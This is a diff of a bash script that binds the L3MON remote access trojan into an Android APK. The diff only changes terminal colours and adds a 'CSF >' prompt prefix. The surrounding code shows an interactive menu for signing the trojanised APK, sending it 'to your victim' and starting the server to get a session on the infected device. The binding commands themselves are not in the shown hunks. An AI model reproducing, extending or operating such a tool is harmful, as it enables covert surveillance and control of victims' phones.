@@ -1,8 +1,8 @@
 #!/bin/bash
 echo
 PWD=$(pwd)
-printf "\e[1;34;40m In order to bind lemon rat in your desired apk file you must have created a lemon rat previously\e[0m\n"
-printf "\e[1;96;40m IF YOU HAVE ALREADY CREATED A LEMON RAT THEN PRESS ENTER TO CONTINUE ELSE PRESS 'y' to start the server of lemon\e[0m__"
+printf "\e[\e[1;34;40m In order to bind lemon rat in your desired apk file you must have created a lemon rat previously\e[0m\n"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;96;40m IF YOU HAVE ALREADY CREATED A LEMON RAT THEN PRESS ENTER TO CONTINUE ELSE PRESS 'y' to start the server of lemon\e[0m__"
 read choice
 if [[ $choice == y ]]
 then
@@ -16,7 +16,7 @@ else
 printf "\e[1;31m Continuing the program .........\e[0m\n"
 fi
 echo
-printf "\e[1;31mEnter your input apk (path/name.apk) ==> \e[0m"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter your input apk (path/name.apk) ==> \e[0m"
 read inputapk
 printf "\n"
 printf "\e[1;94mProcessing\e[0m"
@@ -40,13 +40,13 @@ printf "\e[1;31m If any error occur during binding the rat, you may ask us on te
 echo
 printf "\e[1;34m If it is successfully binded then you can choose following options:-\e[0m\n"
 echo
-printf "\e[1;32m>(01). Sign the binded apk file\e[0m\n"
-printf "\e[1;32m>(02). Send the signed + binded apk file to your victim\e[0m\n"
-printf "\e[1;32m>(03). Install the signed + binded apk in your device \e[0m\n"
-printf "\e[1;32m>(04). Remove the binded apk from you decive\e[0m\n"
-printf "\e[1;32m>(05). Remove the signed + binded apk from your device\e[0m\n"
-printf "\e[1;32m>(06). Start the lemon server to get the session \e[0m\n"
-printf "\e[1;32m>>>>>> Run 'quit' to EXIT this program\e[0m\n"
+printf "\e[2;32m>(01). Sign the binded apk file\e[0m\n"
+printf "\e[2;32m>(02). Send the signed + binded apk file to your victim\e[0m\n"
+printf "\e[2;32m>(03). Install the signed + binded apk in your device \e[0m\n"
+printf "\e[2;32m>(04). Remove the binded apk from you decive\e[0m\n"
+printf "\e[2;32m>(05). Remove the signed + binded apk from your device\e[0m\n"
+printf "\e[2;32m>(06). Start the lemon server to get the session \e[0m\n"
+printf "\e[2;32m>>>>>> Run 'quit' to EXIT this program\e[0m\n"
 echo
 while true
 do
@@ -57,7 +57,7 @@ if [[ $uopt == 1 ]] || [[ $uopt == 01 ]]
 then
 printf "\e[1;97;40m In order to sign your binded apk file download the apk signer app from playstore (link:- https://play.google.com/store/apps/details?id=com.haibison.apksigner ) and save the signed apk with name 'L3MON_binded.signed.apk' at same place where your unsigned binded apk file was saved!!\e[0m\n"
 echo
-printf "\e[1;31m press enter key after you have signed the apk or run 'quit' to EXIT the program\e[0m__"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m press enter key after you have signed the apk or run 'quit' to EXIT the program\e[0m__"
 read hung
 if [[ $hung == quit ]]
 then
@@ -83,9 +83,9 @@ if [[ $seek == L3MON_binded.apk ]]
 then
 rm -rf L3MON_binded.apk
 cd $PWD
-printf "\e[1;31m L3MON_binded.apk is removed from your device\e[0m\n"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.apk is removed from your device\e[0m\n"
 else
-printf "\e[1;31m L3MON_binded.apk is either deleted previously or not found!!\e[0m\n"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.apk is either deleted previously or not found!!\e[0m\n"
 fi
 elif [[ $uopt == 5 ]] || [[ $uopt == 05 ]]
 then
@@ -95,9 +95,9 @@ if [[ $siik == L3MON_binded.signed.apk ]]
 then
 rm -rf L3MON_binded.signed.apk
 cd $PWD
-printf "\e[1;31m L3MON_binded.signed.apk is removed from your device\e[0m\n"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.signed.apk is removed from your device\e[0m\n"
 else
-printf "\e[1;31m L3MON_binded.signed.apk is either deleted previously or not found!!\e[0m\n"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.signed.apk is either deleted previously or not found!!\e[0m\n"
 fi
 elif [[ $uopt == 6 ]] || [[ $uopt == 06 ]]
 then
@@ -112,6 +112,6 @@ elif [[ $uopt == quit ]]
 then
 exit
 else
-printf "\e[1;34;43m Please select a valid option!!\e[0m\n"
+printf "(•) \e[1;34;43m Please select a valid option!!\e[0m\n"
 fi
 done
